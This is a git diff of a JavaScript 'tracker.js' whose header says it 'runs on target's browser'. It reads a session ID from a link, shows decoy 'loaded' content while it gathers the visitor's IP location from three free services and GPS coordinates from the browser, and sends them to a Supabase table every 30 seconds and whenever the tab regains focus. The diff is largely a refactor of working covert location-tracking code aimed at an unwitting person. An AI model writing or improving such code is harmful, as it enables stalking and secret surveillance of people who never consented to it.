@@ -1,34 +1,32 @@
 // ═══════════════════════════════════════════════════════════
-// TRACKER — captures IP + location, writes to Supabase
+// TRACKER — runs on target's browser
 // ═══════════════════════════════════════════════════════════
 
 (() => {
   'use strict';
 
-  const db = getSupabase();
-  const PING_INTERVAL = 30_000; // 30 seconds
-  let sessionId = null;
+  console.log('🎯 tracker.js loaded');
 
-  // ── Get session ID from URL ──────────────────
+  const PING_INTERVAL = 30000;
+  let db;
+  let sessionId;
+
   function getSessionId() {
     const params = new URLSearchParams(window.location.search);
     return params.get('s') || params.get('id');
   }
 
-  // ── Check if session is valid and active ─────
   async function isSessionActive(id) {
-    const { data, error } = await db
+    const { data } = await db
       .from('sessions')
       .select('is_active')
       .eq('id', id)
       .single();
-
     return data?.is_active === true;
   }
 
-  // ── Get IP + Geolocation from free APIs ──────
   async function getIPLocation() {
-    // Try ipwho.is first (free, no key, CORS enabled)
+    // Try ipwho.is
     try {
       const res = await fetch('https://ipwho.is/');
       if (res.ok) {
@@ -46,9 +44,7 @@
           };
         }
       }
-    } catch (e) {
-      console.debug('ipwho.is failed:', e.message);
-    }
+    } catch (e) { console.debug('ipwho.is failed'); }
 
     // Fallback: ipapi.co
     try {
@@ -66,9 +62,7 @@
           timezone: d.timezone || 'Unknown',
         };
       }
-    } catch (e) {
-      console.debug('ipapi.co failed:', e.message);
-    }
+    } catch (e) { console.debug('ipapi.co failed'); }
 
     // Fallback: freeipapi.com
     try {
@@ -86,20 +80,16 @@
           timezone: d.timeZone || 'Unknown',
         };
       }
-    } catch (e) {
-      console.debug('freeipapi.com failed:', e.message);
-    }
+    } catch (e) { console.debug('freeipapi failed'); }
 
     return null;
   }
 
-  // ── Get GPS location (high accuracy) ─────────
   function getGPSLocation() {
-    return new Promise(resolve => {
+    return new Promise((resolve) => {
       if (!navigator.geolocation) { resolve(null); return; }
-
       navigator.geolocation.getCurrentPosition(
-        pos => resolve({
+        (pos) => resolve({
           latitude: pos.coords.latitude,
           longitude: pos.coords.longitude,
           gpsAccuracy: pos.coords.accuracy,
@@ -110,19 +100,15 @@
     });
   }
 
-  // ── Send ping to Supabase ────────────────────
   async function sendPing() {
     if (!sessionId) return;
 
-    // Check session still active
     const active = await isSessionActive(sessionId);
     if (!active) { console.debug('Session inactive'); return; }
 
-    // Get IP-based location
     const ipLoc = await getIPLocation();
-    if (!ipLoc) { console.debug('Could not get IP location'); return; }
+    if (!ipLoc) { console.debug('No IP location'); return; }
 
-    // Try GPS for better accuracy
     const gps = await getGPSLocation();
 
     const record = {
@@ -135,48 +121,44 @@
       country: ipLoc.country,
       isp: ipLoc.isp,
       timezone: ipLoc.timezone,
-      accuracy: gps
-        ? `gps (±${Math.round(gps.gpsAccuracy)}m)`
-        : 'ip (~5-25km)',
+      accuracy: gps ? `gps (±${Math.round(gps.gpsAccuracy)}m)` : 'ip (~5-25km)',
       raw_data: { ip: ipLoc, gps: gps || null },
     };
 
     const { error } = await db.from('locations').insert(record);
-
     if (error) {
-      console.debug('Failed to send ping:', error.message);
+      console.debug('Ping failed:', error.message);
     } else {
-      console.debug('📍 Location ping sent');
+      console.debug('📍 Ping sent');
     }
   }
 
-  // ── Fake "loaded" UI transition ──────────────
-  function showFakeContent() {
+  function showContent() {
     setTimeout(() => {
-      const loading = document.getElementById('loading');
-      const content = document.getElementById('content');
-      if (loading) loading.style.display = 'none';
-      if (content) content.classList.remove('loaded');
+      const l = document.getElementById('loading');
+      const c = document.getElementById('content');
+      if (l) l.style.display = 'none';
+      if (c) c.classList.remove('hidden');
     }, 2500);
   }
 
-  // ── Init ─────────────────────────────────────
   async function init() {
     sessionId = getSessionId();
-    if (!sessionId) return;
+    if (!sessionId) { console.debug('No session ID'); return; }
+
+    try {
+      db = getSupabase();
+    } catch (e) {
+      console.error('Supabase init failed:', e);
+      return;
+    }
 
     const active = await isSessionActive(sessionId);
-    if (!active) return;
+    if (!active) { console.debug('Session not active'); return; }
 
-    showFakeContent();
-
-    // First ping immediately
+    showContent();
     await sendPing();
-
-    // Periodic pings
     setInterval(sendPing, PING_INTERVAL);
-
-    // Ping when user returns to tab
     document.addEventListener('visibilitychange', () => {
       if (!document.hidden) sendPing();
     });
